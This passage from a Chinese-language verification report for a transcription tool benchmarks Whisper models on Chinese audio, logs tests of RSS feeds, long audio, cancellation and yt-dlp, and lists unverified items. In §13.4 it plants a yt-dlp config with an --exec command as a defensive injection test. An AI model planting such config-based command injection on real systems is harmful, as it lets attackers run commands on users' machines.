| ASR RTF             | **0.055（18.2x 实时）** | **0.377（2.7x 实时）**  |
| 端到端总耗时        | 28.3 s                  | 148.1 s                 |
| 置信度 min/max/mean | 0.67 / 0.90 / **0.81**  | 0.89 / 0.99 / **0.95**  |
| 繁体字泄漏段数      | 有（见下）              | **0 / 22**              |
| 时间戳单调          | ✅                      | ✅                      |
| maxEnd vs 时长      | 335,970 / 337,038 ✅    | 335,710 / 337,038 ✅    |

### 12.2 真实中文转写文本对照（同一段音频）

**base** —— 内容词大面积出错：

```
[1.2s]  推特来自危机摆科,自由的摆科权书,王子ZH.Wikipedia.org。
[12.2s] 推特,非官方中文名称推特,是一个社交网络及微博课服务…
[79.1s] …推特开发小队获得了2007年的South by Southwestern,网站不论得了大奖…包括《花耳街日报》。
[130.2s] …印度梦买连环恐怖袭击事件,麦克尔结克训试事,导中国大陆的中央电视台新台纸大国,使手事件…
[158.8s] 現在 美國總統奧巴馬 NBA球星奧尼爾              ← 繁体泄漏
[169.6s] 而古歌大中华区前总裁李开夫开设的账号…
[186.6s] 布兰尼,美国前农统,乔志W不时及英国女王等。
```

**large-v3-turbo-q5_0** —— 同样几段：

```
[1.2s]  Twitter,来自维基百科,自由的百科全书,网址zh.wikipedia.org。
[12.0s] Twitter,非官方中文名称Twitter,是一个社交网络及微博客服务…
[79.1s] …Twitter开发小队获得了2007年的South by Southwest网站部落格类大奖…包括华尔街日报。
[130.2s] …印度孟买连环恐怖袭击事件、迈克尔杰克逊逝世,到中国大陆的中央电视台新台纸大火、石首事件…
[158.8s] 现在,美国总统奥巴马,NBA球星奥尼尔,Google,白宫和诸多新闻媒体…
[169.6s] …而谷歌大中华区前总裁李开复开设的账号更使推特在中国大陆提高了知名度。
[186.6s] 布兰尼、美国前总统乔治·W.布什及英国女王等。
```

逐词对照：

| 正确             | base                    | large-v3-turbo             |
| ---------------- | ----------------------- | -------------------------- |
| 维基百科         | **危机摆科** ❌         | 维基百科 ✅                |
| 百科全书         | **摆科权书** ❌         | 百科全书 ✅                |
| 微博客服务       | **微博课服务** ❌       | 微博客服务 ✅              |
| 华尔街日报       | **花耳街日报** ❌       | 华尔街日报 ✅              |
| 752%             | **752的** ❌            | 752% ✅                    |
| 印度孟买         | **印度梦买** ❌         | 印度孟买 ✅                |
| 迈克尔杰克逊逝世 | **麦克尔结克训试事** ❌ | 迈克尔杰克逊逝世 ✅        |
| 谷歌 / 李开复    | **古歌 / 李开夫** ❌    | 谷歌 / 李开复 ✅           |
| 乔治·W.布什      | **乔志W不时** ❌        | 乔治·W.布什 ✅             |
| Scala            | Scatter ❌              | Scatter ❌（**两者都错**） |

### 12.3 结论与建议（如实说）

1. **whisper `base` 中文不可用。** 不是"稍差"，是专有名词几乎全错，转写稿无法作为笔记使用，
   更无法喂给 LLM 做思维导图（错误会被放大）。
2. **`large-v3-turbo-q5_0` 中文质量很好**（547 MB，置信度均值 0.95，零繁体泄漏）。
3. **但 CPU 上 RTF 0.377，只有 2.7x 实时** —— 1 小时录音要跑 **约 22 分钟**。可接受为后台任务，
   **交互式场景不可接受**。→ **中文用户强烈建议装 GPU 后端**（这给 ADR-003 决策 3 的
   CUDA/Vulkan spike 增加了紧迫性：中文用户是主要用户群，而他们最需要 GPU）。
4. **繁简问题有廉价解法且已验证**：加初始 prompt `以下是普通话的句子，请使用简体中文转写。`
   实测能把 base 的输出从 `對我做了介紹` 纠正为 `对我做了介绍`。
   → **已作为中文默认参数写进流水线调用**。注意这**只解决字形，不解决准确率**。
5. **VAD 对中文正常**：337s 切出 13 个 chunk，边界落在静音处，时间戳单调，无越界。
6. **建议的中文档位**（供 Manager 决策）：
   | 场景               | 建议                                                                                                            |
   | ------------------ | --------------------------------------------------------------------------------------------------------------- |
   | F3 实时字幕        | **sherpa `streaming-zipformer-zh-14M`**（74 MB，RTF 0.01–0.07，简体）                                           |
   | 离线转写（有 GPU） | **`large-v3-turbo-q5_0`**                                                                                       |
   | 离线转写（纯 CPU） | `large-v3-turbo-q5_0` 但明确告知耗时；**不要提供 base/small 中文选项**（会让用户以为产品很差）                  |
   | 未来可评估         | **FunASR / Paraformer**（memo.ac 就同时装了 FunASR）；sherpa-onnx 已支持 Paraformer 与 SenseVoice，**本轮未测** |

---

## §13 未验证项补跑

### 13.1 真实 RSS feed `[实测]`

```
https://librivox.org/rss/47
   title: Count of Monte Cristo, The by Alexandre Dumas (1802 - 1870)
   isCollection: true | episodes: 128
     - Marseilles–The Arrival -> https://www.archive.org/download/count_monte_cristo_0711_librivox/…

https://feeds.megaphone.fm/nationalaeronauticsandspaceadministration8162188566
   title: NASA's Curious Universe
   isCollection: true | episodes: 102
     - There's More Space in Your Life Than You Think -> https://chrt.fm/track/477F33/…
```

两种真实 feed（LibriVox 与 Megaphone）都正确解析出标题与全部 enclosure。

### 13.2 长音频（33.6 分钟）`[实测]`

```
duration : 33.56 min | 2013 s      downloaded: 16,108,273 bytes
chunks   : 80 | segments 430
timings  : {"probe":29771,"fetch":24018,"normalize":1395,"vad":1877,"asr":179866}
ASR RTF  : 0.0893 => 11.2x realtime      total: 237.0 s
peak RSS : 89 MB                          ← 关键：内存不随音频长度增长
persisted chunks contiguous: true count 80
monotonic: true    maxEnd: 2,009,960 vs duration 2,013,414
  [0.5s]    The Count of Monte Cristo by Alexandra Dumont Chapter 5, The Marriage Feast.
  [1999.6s] So saying, he leaped into a boat, desiring to be rode on board the Farion,
```

**峰值内存只有 89 MB**，80 个 chunk 连续无缺口 —— 分块流式设计在长输入上成立。

### 13.3 中途取消 `[实测]`

```
starting 33-min transcription, will cancel after 3 chunks...
  >>> CANCELLING after 3 chunks
threw            : YES (cancelled)
chunks persisted : 3 [0,1,2]        ← 部分结果保留（D-01 §4.4 软取消）
orphan whisper procs after 1.5s: 0  ✅ 无孤儿进程
lane permits held: []               ✅ 全部释放
post-cancel lane acquire: ✅ immediate (no deadlock)
leftover chunk JSON files: 0        ✅ 临时文件已清理
```

> ⚠️ **测试脚手架的假阳性教训**：第一版用 `pgrep -c whisper-cli` 数进程，把**并行跑的另一个
> 后台任务**也数了进去，报出"❌ 泄漏 2 个"。改为**按父进程 PID 归属**后为 0。
> 与 ADR-008 记录的"假绿灯"是同一类问题的镜像：**假红灯**同样会误导判断。

### 13.4 yt-dlp 路径 `[实测]`

```
isAvailable: {"ok":true}    version: 2026.07.04
probe OK -> {"title":"Big Buck Bunny 60fps 4K - Official Blender Foundation Short Film",
             "durationMs":635000,"uploader":"Blender","tracks":7,"producedBy":"yt-dlp"}
```

**并且验证了硬化参数真的生效**（这是本轮最有价值的安全验证）：

```
planted /root/.config/yt-dlp/config  ->  --exec "touch /tmp/e2e/PWNED"
run YtDlpSource.probe(...)
PWNED file created? -> NO ✅ --ignore-config held
```

**`--ignore-config` 不再是"我们配了这个参数"，而是"植入真实攻击后它挡住了"。**

### 13.5 ⚠️ 补跑过程中抓到的第三个 bug：流水线绕过了回退链

长音频那次跑挂在 `TypeError: fetch failed`（连 CDN 超时）。查下去发现真正的问题不是网络：

`TranscribePipeline.run()` 调的是 `registry.resolve()` + `source.probe()`，
**绕过了我在 T-020 加的 probe 回退链**。后果有两个：

1. **GPL 兜底在真实导入路径里永远不会触发** —— TD-002 的解析顺序在最关键的那条代码路径上是摆设；
2. 第一个候选的**瞬时网络错误会直接失败整个任务**，而不是换下一个适配器 —— 这正是它暴露的方式。

修复：新增 `registry.probeWithSource()`，返回**真正成功的那个适配器**，流水线用它同时拿到
`source` 和 `info`（fetch 必须用与 probe 相同的适配器，否则会按分数重新解析、可能换成另一个）。
回归测试：`media/__tests__/registryFallback.test.ts`。

---

## §14 T-025 后的诚实清单

### 14.1 本轮新增已实测

1. F3 流式引擎真跑（中文，RTF 0.01–0.07，逐字时间戳）
2. F3 两阶段合并真跑（用户编辑被保留，banner 与 diff 正确）
3. 中文转写 base vs large-v3-turbo 对照（真实 5.6 分钟中文音频）
4. 繁简 prompt 缓解措施验证有效
5. 真实 RSS feed × 2（LibriVox、Megaphone）
6. 长音频 33.6 分钟 / 80 chunk / 峰值内存 89 MB
7. 中途取消：0 孤儿进程、0 permit 泄漏、无死锁、临时文件已清
8. yt-dlp 真实 probe
9. **`--ignore-config` 抗真实注入攻击验证**
10. 三个新 bug（close 早于 drain、流水线绕过回退链、测试脚手架假红灯）已修 + 回归测试
11. 测试 75 → **101 全绿**

### 14.2 仍未验证 / 未实现

| #   | 项                                     | 状态                                                                           |
| --- | -------------------------------------- | ------------------------------------------------------------------------------ |
| 1   | **HLS `.m3u8` 真实流**                 | **仍未跑过**                                                                   |
| 2   | **Windows / macOS** 全部分支           | **仍未验证**（无机器）                                                         |
| 3   | **F3 端到端接浏览器麦克风**            | **未做** —— 只测到 `AsrStream` 层；`/ws/asr-worker` 协议与前端接线属 T-022     |
| 4   | **F3 两阶段在 daemon 里的调度**        | **未做** —— 合并函数已就绪，但"停止录音后自动排一个离线重跑 job"需要队列层接线 |
| 5   | `sherpa-onnx-node` 未进 `package.json` | **待 Manager 指派**（该文件不属我）                                            |
| 6   | ffmpeg 协议白名单                      | **未构造恶意 HLS 播放列表实测**                                                |
| 7   | 解压防护（Zip-Slip 等）                | **未实现**，属 `packages/downloader`（`model-mgmt`），见 SECURITY.md 附表      |
| 8   | 两个 TOCTOU 缺口                       | **已知未修**，已按 ADR-008 决策 4 逐条记入 `docs/SECURITY.md` §3               |
| 9   | 说话人分离（diarization）              | **未实现**（sherpa-onnx 有离线 API，未接）                                     |
| 10  | FunASR / Paraformer 中文对比           | **未测**                                                                       |

### 14.3 建议下一步

1. **[最高] 给中文用户跑 GPU spike**：§12.3 已量化 —— 中文必须用 large-v3-turbo，而它在 CPU 上
   只有 2.7x 实时。中文是主要用户群，**ADR-003 决策 3 的 CUDA/Vulkan 实测因此从"性能优化"
   升级为"中文可用性前提"**。
2. **[高] F3 接线到 daemon 与前端**（T-022 配合）：麦克风 → WS → `AsrStream` → 停止后自动排重跑 job。
3. **[中] 评估 FunASR / Paraformer**：sherpa-onnx 已支持，可能在中文上以更小体积达到 large 级质量。
